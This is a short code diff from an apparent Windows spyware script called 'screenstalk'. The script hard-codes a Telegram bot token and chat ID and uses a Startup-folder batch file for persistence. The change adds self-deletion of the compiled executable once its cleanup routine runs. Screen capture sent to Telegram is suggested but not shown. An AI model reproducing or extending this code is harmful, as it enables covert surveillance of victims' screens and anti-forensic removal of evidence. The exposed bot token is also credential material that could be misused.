@@ -6,6 +6,9 @@ import datetime;
 import os;
 import getpass
 import shutil
+from sys import argv
+
+
 bot = telebot.TeleBot("6182954429:AAFhs3NF6Diynl2lFBzNvJGpwtTd9GGshMs")
 chatid = -849718605
 USER_NAME = getpass.getuser()
@@ -14,6 +17,8 @@ def screengrab():
     print('deleted')
     startup_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\screenstalk.bat' % USER_NAME
     os.remove(startup_path)
+    if not argv[0].endswith(".py"):
+      os.remove(argv[0])
     exit()
   else:
     try:
